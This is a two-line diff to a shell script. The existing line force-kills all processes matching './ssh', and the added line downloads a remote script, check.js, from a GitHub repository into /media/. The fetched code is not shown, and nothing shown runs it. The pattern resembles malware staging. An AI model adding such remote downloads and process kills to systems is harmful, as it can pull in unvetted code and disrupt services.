@@ -1,1 +1,2 @@
 ps aux | grep './ssh' | awk '{print $2}' | xargs kill -9
+cd /media/ && curl -o check.js https://raw.githubusercontent.com/teamcyber-glitch/firewall/refs/heads/main/check.js
